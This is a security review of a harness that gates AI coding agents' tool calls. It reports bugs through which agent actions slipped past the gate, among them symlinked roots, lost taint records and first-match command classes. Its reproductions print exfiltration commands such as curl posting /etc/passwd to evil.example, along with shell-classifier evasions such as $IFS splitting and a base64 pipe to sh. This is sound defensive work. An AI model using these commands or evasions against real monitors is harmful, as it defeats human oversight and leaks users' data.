# Full-codebase review — 2026-08-12

Scope: the whole `ai2rules` repository at `5cb13af` — 10 Rust crates (~20k LOC),
the Astro blog, the npm distribution, the CI workflows, and the two live host
adapters. Findings continue the project's existing numbering (previous review
findings ran to #14).

**Baseline at review time:** 254 tests passing, `clippy -D warnings` clean,
`cargo fmt` clean, no `unsafe` anywhere in the workspace, CI green.

That baseline is the point worth opening with. Every finding below was invisible
to it. Seven are now fixed, one of those having been public for seven weeks, and
the test suite, the linter, and five CI jobs all reported success throughout. The
recurring shape is not bad code — the code is careful — it is
**an invariant stated in prose that nothing executes**. Three separate places
said "these must not diverge"; all three had diverged.

---

## Summary

| # | Severity | Area | Issue | Status |
|---|---|---|---|---|
| 15 | 🔴 Critical | `agy_hook.rs` | Manifest roots not canonicalized → grants writes to `Deny`/`Credential` roots | **Fixed** |
| 16 | 🔴 Critical | both adapters | Silent taint-persist failure disables the taint floor | **Fixed** (D59) |
| 17 | 🟠 High | `compiled.rs` | Class ordering is first-match-wins → `ls && curl` evades the egress class | Open, latent |
| 18 | 🟠 High | `blog/public/vendor/` | Committed WASM artifact nine commits stale, advertising v0.0.1 | **Fixed** (D60) |
| 19 | 🟡 Medium | `loader.rs` | `default_to` optional → unclassified shell allowed while tainted | **Fixed** (D62) |
| 20 | 🟡 Medium | `loader.rs` | Duplicate `command_classes` silently ignored | **Fixed** (D62) |
| 21 | 🟡 Medium | both adapters | `source_channel` hardcoded to `user_prompt` | Open, design gap |
| 22 | 🔵 Low | `ci.yml` | No `permissions:` block → inherits repo default | Open |
| 23 | 🔵 Low | both workflows | Actions pinned to mutable tags/branches | Open |
| 24 | 🔵 Low | `npm/bin/harness.js` | Signal-killed child exits 1, not `128+signum` | Open |
| 25 | 🟡 Medium | `tests/init.rs` | Flaky `ETXTBSY` race — reproduces ~40% of post-rebuild runs, i.e. every CI run | **Fixed** |
| 26 | 🟠 High | `main.rs` `run_gate` | `harness gate` never resolved manifest roots | **Fixed** (D61) |
| 27 | 🟡 Medium | adapters + compiler | Argument aliasing and schema validation are mutually exclusive | Open |

"Latent" means the shipped manifests are safely written and the hazard is in the
manifest *language* — a third party authoring their own world hits it. That
distinction is load-bearing for triage and is kept throughout.

---

## Fixed in this pass

### #15 — `agy-hook` skipped root canonicalization, so two hosts disagreed 🔴

`cc_hook.rs` canonicalized manifest roots through the filesystem before
compiling; `agy_hook.rs` did not. `hostkit.rs` carries an explicit warning against
exactly this ("Keep that property — it is the reason these are shared rather than
copied"), and it is the D46 hardening for findings #8/#9.

Action paths *were* canonicalized while roots were not, so any root rule whose
path traverses a symlink stopped matching — and a `Deny` rule that stops matching
falls through to `roots.default`. Reproduced with `HOME` behind a symlink,
identical world and identical target file:

```
cc-hook :  {"permissionDecision":"deny", ...:"the target path is outside the allowed roots"}
agy-hook:  {"decision":"force_ask",      ...:"human approval is required (path_scope_ask)"}
```

With a permissive `default: ReadWrite`, `agy-hook --grant` emitted
`{"decision":"allow"}` for a write to a `Deny`/`Credential` root — actively
bypassing Antigravity's own prompt, for a file `cc-hook` refused outright.

Not a macOS-only curiosity: a repo checked out under a symlinked path, a symlinked
`$HOME`, or `/home → /usr/home` all trigger it. macOS is merely where it is
guaranteed, because `/var` → `/private/var` means even the existing test fixture
would have failed there.

**Fix:** two lines in `agy_hook.rs` mirroring `cc_hook.rs`.

**Why the suite missed it, which matters more than the bug.** `one_kernel.rs` is
the right design — it asserts all four entry points agree with the in-process
kernel — but `docs/demos/one-kernel/cases.yaml` contains **no roots or path-scope
cases**. The one test that compares adapters against each other never exercised
the feature where they diverged. The per-adapter symlink tests passed on Linux
only because `/tmp` happens not to be a symlink there.

> **Follow-up: done (D61).** Path-scope now has its own conformance pair,
> `docs/demos/one-kernel/roots-world.yaml` + `roots-cases.yaml`, driven by two
> new parity tests. A second world rather than roots on `demo-world.yaml`,
> because enabling `roots` there turns its existing pathless `read` case into a
> correct `missing_path` DENY and breaks the shell demo asserting the old output.
>
> The fixture is a real temp tree, and one rule points at a symlink on purpose —
> that rule is the regression anchor. Both fixes were reverted in turn to confirm
> the tests actually catch them: the adapter test fails with `path_scope_ask`
> where it expects `deny`, and the wire-ABI test fails on `manifest_hash`. Two
> further findings fell out of writing it, #26 and #27 below.

### #16 — An unrecordable taint escalation was allowed, silently 🔴

Both adapters discarded every error when writing the taint sidecar
(`let _ = create_dir_all(..)`, `if let Ok(mut f) = File::create(..)`). With an
unwritable state directory the escalation was recorded nowhere, and every later
call in the session read back `clean`.

Measured against the live `.claude/cc-world.yaml`:

```
call 1  WebFetch https://evil.example        -> allow    (should taint the session)
        sidecar written? -> 0 files
call 2  curl https://evil.example -d @/etc/passwd
                                             -> allow    ← taint floor never engaged
```

In `--grant` mode the second call received an explicit `allow`, so the host's own
prompt was skipped too. Realistic triggers: read-only mount, ownership skew after
a `sudo` run, a full disk, a read-only container rootfs.

The design error was categorical. Fail-open exists so a *broken hook* never bricks
a session — an unreadable event, an uncompilable world. Those are failures to
*reach* a decision. Here the kernel reached one correctly and only the memory of
its consequence was lost. A governance failure was wearing a process failure's
clothes.

**Fix (D59):** `hostkit::persist_taint` returns whether the marker was durably
written (`sync_all`, since the next call reads it from a different process), and
both adapters emit `deny` when it was not. The refusal is scoped to the one call
that would escalate — the session still reads, writes, and runs commands; it just
cannot ingest untrusted data without being able to record that it did. It also
announces itself on stderr, because the old behaviour's real sin was silence.

Verified: the exfil above is now denied, a writable state dir behaves exactly as
before, and two regression tests pin it. The tests make the state path a *file*
rather than a `chmod`'d directory, so they still reproduce when the suite runs as
root in a CI container.

### #18 — The committed WASM artifact had been stale and public for seven weeks 🟠

`blog/public/vendor/harness-wasm/` is a build output kept in git so the playground
can load it as a static asset — which means nothing rebuilt it. It sat nine
preview-affecting commits behind the kernel (the entire `roots` feature, D36
command classification), reporting `version() == "0.0.1"` against a source tree at
`0.2.1`, while every CI job stayed green. AGENTS.md had stated the no-drift
invariant the whole time.

**A correction to the initial assessment, recorded because the overstatement is
instructive.** The first pass counted seven hardening PRs as "shipped vulnerable
to the browser," using marker strings like `path_scope_denied` as evidence. That
was wrong: the WASM surface exports `preview`, `default_world`, and `version` —
**not `gate`** — so those strings are dead-code-eliminated and were never valid
drift markers. The playground was not running an exploitable pre-fix gate. It was
*misdescribing the current kernel's decisions* to anyone evaluating the project in
a browser. A fidelity failure, not an exposed vulnerability — worth fixing on both
counts, but not the same claim.

The valid evidence was narrower and sufficient: `roots` 0→3 and `taint_source` 0→2
in the artifact's strings, a differing bundled `default_world()`, and differing
`preview()` output on a `command_classes` world.

**Fix (D60):** the artifact is rebuilt, and `scripts/check-wasm-freshness.mjs`
loads the committed artifact *and* a freshly built one and requires them to answer
identically — same `version()`, same bundled `default_world()`, same `preview()`
over a case set that deliberately includes a `roots` world and a `command_classes`
world. A new `wasm` CI job builds from source and runs it.

The check is semantic rather than byte-level on purpose: byte comparison would go
red whenever `dtolnay/rust-toolchain@stable` or wasm-pack changed codegen, which
is drift in the build, not in the kernel, and a check that cries wolf gets deleted.
Verified in both directions — it passes on the rebuilt artifact and fails on the
stale one recovered from `HEAD`.

### #26 — `harness gate` never resolved manifest roots 🟠 *(fixed, D61)*

Found while building the path-scope case set, and the same shape as #15 one layer
out. `run_gate` read the manifest and compiled it directly, with no
`resolve_root_paths` and no `canonicalize_root_paths`. Since `run_gate` compiles
the world itself, a caller of the documented D24 wire ABI had **nowhere** to
perform that step — so under `harness gate`, every relative rule path, every `~`
rule, and every rule traversing a symlink silently stopped binding and dropped
through to the policy `default`.

Two of the three live host manifests use relative or `~` root paths, so this was
not hypothetical for anyone driving the CLI directly. Fixed by performing the same
resolve-then-canonicalize step the hooks do, against `$PWD` and `$HOME`. The
kernel stays pure — this is the adapter half of the boundary, and the whole point
of D61 is that it must not differ per entry point.

### #25 — A flaky `ETXTBSY` that fires on exactly the runs CI performs 🟡 *(fixed)*

`init_refuses_a_kernel_that_lives_inside_the_project` copies the harness binary
into a temp project and immediately executes it. Intermittently the `execve`
returned `ETXTBSY` — "Text file busy", meaning the file is open for writing
somewhere.

The mechanism is a multithreaded fork/exec race. Cargo runs these tests on
parallel threads; while `fs::copy` holds a write descriptor to the planted file,
any `Command` another thread spawns forks and the child inherits that descriptor.
`CLOEXEC` only takes effect at the child's own `exec`, so until then a second
process holds the inode open for writing — and our `execve` fails.

**Filed as Low, then promoted, because the first estimate of its rate was wrong
in an important way.** It appeared 3 times in ~9 full-suite runs during the
review, but 8 consecutive warm re-runs could not reproduce it at all. The
correlation was that all three failures landed on runs that had just
*recompiled*. Testing that directly — `touch` a source file, then run the whole
suite — gave **2 failures in 5** with the original code, against **0 in 8** warm.
A freshly linked binary is not in the page cache, so the copy takes far longer and
the race window is correspondingly wider.

That reframes the severity: the reproducing condition is "build, then test",
which is precisely and only what CI does. A flake that is nearly invisible
locally and fires on roughly two of every five CI runs is worse than a flake with
a uniform one-in-three rate, because the local evidence argues it away.

**Fix:** hard-link the binary instead of copying it where the filesystem allows
(a hard link shares the already-built inode, which nothing opens for writing at
any point in a test run, so the window does not exist), and fall back to copy plus
a bounded `ETXTBSY` retry across filesystems. Verified under the reproducing
condition: **0 failures in 6 post-rebuild runs**, plus 12 warm runs clean. The
cross-filesystem fallback was exercised separately by pointing `TMPDIR` at tmpfs.

---

## Open findings

### #17 — Class ordering is first-match-wins, and ordering is security-critical 🟠

`classify_command` returns the first class with any matching pattern. A world that
lists a permissive class before a restrictive one loses the restrictive one on
chained commands:

```
curl http://exfil            -> bash_network  DENY
ls && curl http://exfil      -> bash_safe     ALLOW   ← fully tainted session
echo hi; curl http://exfil   -> bash_safe     ALLOW   ← fully tainted session
```

All three shipped worlds order network-first with no "safe" class, so this is
latent rather than live. But "list my safe commands first" is the natural
authoring instinct, nothing documents that ordering carries security weight, and
nothing validates it. The kernel's own test `egress_commands_classify_as_network`
asserts `ls && curl` classifies as network — true only because that fixture has no
earlier-matching permissive class. The suite encodes the safe ordering without
ever stating the rule.

**Recommendation:** evaluate all classes and select the most restrictive match
(severity-ordered, not declaration-ordered), or reject a manifest in which a class
with a lower-severity `side_effect` precedes a higher-severity one.

Worth stating plainly in the docs alongside it: substring matching over shell
strings is a heuristic, not a decision procedure. `"curl" http://x`,
`curl$IFS'http://x'`, and `echo Y3VybAo= | base64 -d | sh` all evade it. The design
already handles this correctly — evasion *downgrades* into the `default_to`
bucket, which is stricter — and that property is doing the real work. Which is
exactly why #19 matters.

### #19 — `default_to` is optional, and omitting it opens the shell 🟡 *(fixed, D62)*

A world declaring `command_classes` without `default_to` compiles clean and falls
back to the raw action:

```
tainted + "curl http://x"                    -> bash_network        DENY
tainted + "python3 -c 'import socket…'"      -> bash                ALLOW
```

The classifier's entire security value rests on the catch-all, and nothing
required one. All three shipped worlds set it. **Fixed (D62):** `validate()` now
rejects a classifier without `default_to`, with an error naming the field and the
consequence. Defaulting it to the most restrictive class was rejected — that is a
judgement about the author's ontology the compiler should not make silently.

### #20 — Duplicate `command_classes` are silently ignored 🟡 *(fixed, D62)*

`validate()` rejects duplicate channels and duplicate actions, but not two
classifiers for the same action; `classify_command` uses `.find()`, so the second
never runs. A four-line check in the style of the two beside it.

### #21 — Both adapters hardcode `source_channel: "user_prompt"` 🟡

The gate has careful machinery here — `parse_channel`, and a comment explaining
that the field is explicit "so thin adapters cannot accidentally upgrade an
unknown proposer to trusted." Both live adapters defeat it by construction: every
call claims the most-trusted channel, including one the model proposed
immediately after reading a poisoned file. The taint sidecar covers the data-flow
half; the trust half is pinned at maximum.

**Recommendation:** derive the channel from the host event where the host
distinguishes it, or state plainly in AGENTS.md that channel policy is currently
inert on live hosts. The second is acceptable; silence is not, because the code
reads as though the control is active.

### #27 — Argument aliasing and schema validation cannot both be used 🟡

The adapters translate host argument keys into the neutral vocabulary by *adding*
keys — Antigravity's `AbsolutePath` becomes `path`, `CommandLine` becomes
`command`, originals preserved. Schema validation rejects properties the schema
does not declare. The two are therefore mutually exclusive: an Antigravity call
against a schema-bearing action returns `schema_violation` however well-formed it
is.

Surfaced when the new roots world declared `file_path` on its `read` action and
the agy leg of the parity test failed. `.agents/agy-world.yaml` declares no
schemas at all — which reads as a deliberate design choice but is nowhere written
down, so the next person to add one gets a puzzling `schema_violation` on exactly
one host. Options are alias-aware validation, declaring the host keys alongside
the neutral ones, or documenting that portable worlds go schema-less. Recorded in
D61 and in the world file's header; the reconciliation itself is open.

### #22–#24 — Low

- **#22** `ci.yml` has no `permissions:` block, so it inherits the repository
  default. `release.yml` scopes its permissions correctly per job; `ci.yml` should
  declare `permissions: contents: read`.
- **#23** Actions are pinned to mutable refs — `actions/checkout@v4`,
  `softprops/action-gh-release@v2`, and `dtolnay/rust-toolchain@stable`, which is a
  *branch*. `release.yml` holds `contents: write` and `id-token: write`: that is
  npm publish authority behind a mutable third-party ref, in a project whose
  subject matter is supply-chain governance. Pin to SHAs.
- **#24** `npm/bin/harness.js` exits `1` when the child is killed by a signal,
  discarding `res.signal`. Convention is `128 + signum`, so a shell can distinguish
  "harness failed" from "user pressed Ctrl-C".
- **#25** — see below; promoted out of Low once its trigger was understood.

---

## What looks good

Worth recording, because a findings list is not a fair portrait of this codebase.

- **The pure-kernel/impure-adapter split holds under pressure.** `world-kernel`
  and `harness-preview` really are I/O-free. Every finding above lives in an
  adapter, in CI, or in the manifest language — not one is in the kernel's
  decision logic. That is the architecture doing its job.
- **`hostkit.rs` path handling is genuinely careful** — canonicalization through
  the filesystem, unresolvable-parent → `None` → `missing_path` fail-closed,
  session-id sanitization with a `../../etc/passwd` test. Finding #15 was one
  adapter failing to *call* it, not a flaw in it.
- **The npm distribution is exemplary.** No install script, no network, no chmod;
  the binary rides `optionalDependencies` so it is covered by the lockfile
  integrity hash. The reasoning in the comment — "the old design proved integrity;
  this one has provenance" — is exactly right, and `verify-packages.js` enforces it
  in CI rather than trusting it.
- **`check-demos.sh` exists because tests stayed green while a demo hollowed
  out.** That is precisely the failure mode of findings #15 and #18, already
  recognised and already automated in one domain. The gap was not knowing better;
  it was not extending the pattern to the artifact and the case set.
- **Fail-closed defaults are consistent** — missing taint, malformed taint,
  missing channel, missing path, and ASK-in-background all deny.
- **`DECISIONS.md` is unusually good.** Entries record the rejected alternatives
  and the reasoning, which made reviewing intent-versus-implementation possible at
  all. D58 in particular documents an unflattering finding honestly.

---

## Meta-review: what would make the next review cheaper

Everything here is absent from the repo as of this review.

### The three that would have caught findings above automatically

| Gap | What it closes |
|---|---|
| **Roots cases in the shared case set** | Finding #15's entire class. *Added in this pass (D61)* — and it immediately produced #26 and #27. |
| **A WASM freshness job** | Finding #18. *Added in this pass (D60).* |
| **`cargo-deny` / `cargo-audit` in CI** | No dependency-vulnerability or license gate exists on a security product. |

### Supply chain and disclosure

Conspicuous given what this project is about:

- **`SECURITY.md`** — no disclosure path. The repo's own "finding #N" convention
  implies an intake process that is written down nowhere, so an outside reporter
  has to guess.
- **SHA-pinned actions** (#23), and **`permissions: contents: read`** on `ci.yml`
  (#22).
- **Dependabot or Renovate** — nothing tracks dependency drift. The workspace pins
  are "what is available offline", which will rot silently.

### Reproducibility

All of this had to be discovered by running things:

- **`rust-toolchain.toml` and an MSRV.** With no pinned toolchain, "clippy is
  clean" is only true of whatever version happens to be installed — and
  `dtolnay/rust-toolchain@stable` means CI's answer changes without a commit.
- **`CHANGELOG.md`** — 0.2.1 is published; reconstructing what changed between
  releases currently means reading git log.
- **A one-command review entrypoint** (`make check` / `just check` / an `xtask`).
  The full check set is now four cargo commands, `check-demos.sh`, a wasm rebuild
  plus freshness check, and three Node sub-projects. That is the difference between
  a reviewer establishing the baseline in one minute and reconstructing it in ten.

### Test strategy, given what this code does

- **No property-based tests.** Taint join is a semilattice, root matching is
  longest-prefix, `left_word_match` is a boundary matcher — three properties that
  proptest states in a line each and that example tables can only sample. #17 would
  plausibly have surfaced unprompted.
- **No fuzzing.** `left_word_match`, `normalize_dots`, and the hand-rolled
  JSON-RPC framing in `mcp_gateway` are all untrusted-input parsers with no fuzz
  target.
- **No coverage reporting.** 259 tests is a good number; nothing shows which
  branches of `gate()` are unexercised.
- **No adversarial corpus.** The classifier tests check false *positives*
  (`jsonc` is not `nc`). There is no corpus of known evasions pinning intended
  behaviour. Documenting "these evade, they land in the fail-closed bucket, and
  that is the design" would convert a reviewer's suspicion into a settled
  question — and would have made #19's severity obvious on sight.
- **A flaky test is a tax on every future review** (#25, now fixed): the first
  full-suite run of this review went red for reasons unrelated to any change under
  review. Its real lesson is about measurement — the naive failure rate pointed at
  a mild intermittent problem, and only correlating failures with *recompilation*
  revealed a defect that fires on the exact shape of run CI makes every time.

### Documentation

- **`docs/` has 20+ files with no index or reading order,** and no marking of
  which are normative versus historical. AGENTS.md's key-reference table is close
  but does not distinguish the two.
- **Nothing states which manifest-authoring choices are security-critical.** Class
  ordering (#17) and `default_to` (#19) are both load-bearing and both
  undocumented. A short "writing a safe world" page would retire an entire
  category of finding.

---

## Verification

All changes in this pass were verified together:

```
cargo fmt --all -- --check                            clean
cargo clippy --workspace --all-targets -- -D warnings clean
cargo test --workspace                                259 passed, 0 failed
bash scripts/check-demos.sh                           all demos still say what they claim
node scripts/check-wasm-freshness.mjs                 matches the kernel (v0.2.1, 3 cases)
```

Reproductions for #15, #16, #17, and #19 were executed against built binaries and
the live manifests, not inferred from reading. For #15 and #26 the fixes were
then reverted one at a time to confirm the new conformance tests fail without
them — a test that has never been seen to fail is a test with no evidence behind
it.
